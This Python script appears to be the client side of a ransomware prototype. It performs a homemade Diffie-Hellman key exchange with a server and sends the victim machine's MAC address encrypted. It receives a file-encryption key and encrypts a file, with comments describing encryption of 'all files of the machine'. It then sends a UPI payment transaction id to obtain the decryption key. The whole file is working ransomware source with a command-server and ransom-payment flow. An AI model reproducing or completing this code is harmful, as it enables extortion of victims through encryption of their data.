import json
from random import randint
import socket
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
PORT = 9001
CHUNK_SIZE = 4096


def extract_prime_and_primitive_root():
    # read file
    with open('val.json', 'r') as myfile:
        data = myfile.read()

    # parse file
    obj = json.loads(data)

    prime = obj['prime']
    primitive_root = obj['primitive_root']

    # show values
    # print("prime: " + str(obj['prime']))
    # print("primitive_root: " + str(obj['primitive_root']))
    return prime, primitive_root


# Generate a prime number
def gen_prime(start, stop):
    mod_list = []

    # Generate list of prime numbers
    for num in range(start, stop):
        if num > 1:
            for i in range(2, num):
                if (num % i) == 0:
                    break
            else:
                mod_list.append(num)

    # Randomly pick a number to pick a number from the list
    x = randint(1,len(mod_list))
    return mod_list[x]


# b^e%m
def fast_exp(b, e, m):
    r = 1
    if 1 & e:
        r = b
    while e:
        e >>= 1
        b = (b * b) % m
        if e & 1: r = (r * b) % m
    return r


def generate_public_key(private_key, primitive_root, prime):
    # public_key = (primitive_root**private_key)%prime
    # return public_key
    public_key = fast_exp(primitive_root, private_key, prime)
    return public_key


def key_pair_generation_diffie_hellman(prime, primitive_root):
    private_key = gen_prime(1, prime) # Secret key
    public_key = generate_public_key(private_key, primitive_root, prime) # Public key
    return private_key, public_key


def calculate_secret_key(public_key_a, private_key_b, prime):
    secret_key = fast_exp(public_key_a, private_key_b, prime)
    return secret_key


def establish_connection_with_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((socket.gethostname(), PORT))
    return s


def send_message_to_server(server_endpoint, msg):
    msg = str(msg) 
    msg_encoded = msg.encode('utf-8')
    server_endpoint.send(msg_encoded)


def receive_message_from_server(server_endpoint):
    msg = server_endpoint.recv(CHUNK_SIZE)
    msg_decoded = msg.decode('utf-8')
    return msg_decoded


def send_message_to_server_dierct(server_endpoint, msg):
    server_endpoint.send(msg)

def receive_message_from_server_dierct(server_endpoint):
    msg = server_endpoint.recv(CHUNK_SIZE)
    return msg


def fernet_key_generator(secret_key):
    password_provided = str(secret_key)
    password = password_provided.encode()

    salt = b"\xb9\x1f|}'S\xa1\x96\xeb\x154\x04\x88\xf3\xdf\x05"

    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                    backend=default_backend())

    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)
    return f



if __name__ == "__main__":
    prime, primitive_root = extract_prime_and_primitive_root()
    print("prime: " + str(prime))
    print("primitive_root: " + str(primitive_root))

    private_key_client, public_key_client = key_pair_generation_diffie_hellman(prime, primitive_root)

    print("private_key_client: " + str(private_key_client))
    print("public_key_client: " + str(public_key_client))

    # Establishing connection with client
    server_endpoint = establish_connection_with_server()
    print("[+]Connected with server")

    # Receiving server public key from server
    print("[+]Receiving server public key from server")
    public_key_server = receive_message_from_server(server_endpoint)
    print("public_key_server: " + str(public_key_server))

    # Sending client public key to server
    print("[+]Sending client public key to server")
    send_message_to_server(server_endpoint, public_key_client)

    secret_key = calculate_secret_key(int(public_key_server), int(private_key_client), prime)
    print("secret key: " + str(secret_key))

    fernet_key = fernet_key_generator(secret_key)

    # Sending mac address to server
    print("[+]Sending mac address to server")
    mac_addr = str(uuid.getnode())
    print("mac_addr: " + str(mac_addr))
    mac_addr_encoded = mac_addr.encode('utf-8')
    print("mac_addr_encoded: " + str(mac_addr_encoded))
    mac_addr_encoded_encrypted = fernet_key.encrypt(mac_addr_encoded)
    print("mac_addr_encoded_encrypted: " + str(mac_addr_encoded_encrypted))
    send_message_to_server_dierct(server_endpoint, mac_addr_encoded_encrypted)

    # Receiving file_enc_dec_fernet_key from server
    print("[+]Receiving file_enc_dec_fernet_key from server")
    file_enc_dec_fernet_key_encrypted = receive_message_from_server_dierct(server_endpoint)
    print("file_enc_dec_fernet_key_encrypted: " + str(file_enc_dec_fernet_key_encrypted))
    file_enc_dec_fernet_key_decrypted = fernet_key.decrypt(file_enc_dec_fernet_key_encrypted)
    print("file_enc_dec_fernet_key_decrypted: " + str(file_enc_dec_fernet_key_decrypted))

    # print(type(file_enc_dec_fernet_key_decrypted))

    file_enc_dec_fernet_key = Fernet(file_enc_dec_fernet_key_decrypted)

    # Encrypt all files of the machine using this key
    print("[+]Encrypting all files of the machine using this key")
    with open('test.txt', "rb") as file:
        file_data = file.read()
    encrypted_data = file_enc_dec_fernet_key.encrypt(file_data)
    with open('test_enc.txt', "wb") as file:
        file.write(encrypted_data)

    # Sending upi transaction id to server
    print("[+]Sending upi transaction id to server to get the decryption key")
    upi_transaction_id = 36546343434
    send_message_to_server(server_endpoint, upi_transaction_id)

    # Recieving decryption key from server
    print("[+]Recieving decryption key from server")
    file_enc_dec_fernet_key_encrypted = receive_message_from_server_dierct(server_endpoint)
    print("file_enc_dec_fernet_key_encrypted: " + str(file_enc_dec_fernet_key_encrypted))
    file_enc_dec_fernet_key_decrypted = fernet_key.decrypt(file_enc_dec_fernet_key_encrypted)
    file_enc_dec_fernet_key = Fernet(file_enc_dec_fernet_key_decrypted)
    with open('test_enc.txt', "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = file_enc_dec_fernet_key.decrypt(encrypted_data)
    # write the original file
    with open('text2.txt', "wb") as file:
        file.write(decrypted_data)